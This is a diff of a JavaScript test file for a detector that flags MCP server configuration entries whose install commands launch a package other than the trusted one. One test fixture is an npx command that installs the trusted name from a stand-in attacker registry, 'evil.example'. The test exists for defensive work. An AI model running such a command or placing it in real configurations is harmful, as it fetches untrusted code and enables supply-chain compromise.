@@ -114,7 +114,7 @@ for (const [cand, kind, dbName, technique] of CASES) {
     assert.equal(r.lookalike, true, `${cand} should be flagged`);
     assert.equal(r.matches[0].db_name, dbName, JSON.stringify(r.matches));
     assert.equal(r.matches[0].technique, technique, JSON.stringify(r.matches));
-    assert.match(L.describe(r), new RegExp(`Likely an impersonation of ${dbName.replace(/[/@.]/g, '\\$&')}`));
+    assert.ok(L.describe(r).includes(`Likely an impersonation of ${dbName}`), L.describe(r));
   });
 }
 
@@ -169,6 +169,26 @@ test('checkServer: a vault name launching some other package is flagged even whe
   // …and the entry's own package, at any version, is not.
   assert.equal(L.checkServer({ name: 'mcp-server-filesystem', install_cmd: 'npx -y @modelcontextprotocol/server-filesystem@1.0.0' },
     INDEX, { dbName: 'mcp-server-filesystem' }), null);
+});
+
+test('checkServer: `npx --yes` is read like `npx -y` (a vault key launching another package is still flagged)', () => {
+  const r = L.checkServer({ name: 'mcp-server-memory', install_cmd: 'npx --yes totally-other@2026.1.26' }, INDEX, { dbName: 'mcp-server-memory' });
+  assert.equal(r.matches[0].technique, 'vault-name-on-other-package');
+  assert.match(L.describe(r), /launches totally-other/);
+  assert.equal(L.checkServer({ name: 'mcp-server-memory', install_cmd: 'npx --yes @modelcontextprotocol/server-memory@1.0.0' }, INDEX, { dbName: 'mcp-server-memory' }), null);
+});
+
+test('checkServer: a vault-named key whose package cannot be read is not trusted', () => {
+  const r = L.checkServer({ name: 'mcp-server-memory', install_cmd: 'npx -y --registry=https://evil.example @modelcontextprotocol/server-memory' }, INDEX, { dbName: 'mcp-server-memory' });
+  assert.equal(r.matches[0].technique, 'vault-name-on-other-package');
+  assert.match(r.matches[0].detail, /cannot be read/);
+});
+
+test('checkServer: a key that is a vault name up to case and separators is held to that entry\'s package', () => {
+  const r = L.checkServer({ name: 'MCP_Server_Memory', install_cmd: 'npx -y totally-other@1.0.0' }, INDEX);
+  assert.equal(r.matches[0].technique, 'vault-name-on-other-package');
+  assert.equal(r.matches[0].db_name, 'mcp-server-memory');
+  assert.equal(L.checkServer({ name: 'MCP_Server_Memory', install_cmd: 'npx -y @modelcontextprotocol/server-memory@1.0.0' }, INDEX), null);
 });
 
 test('findings: a lookalike is a lookalike/<technique> finding on a name subject, with no effect', () => {
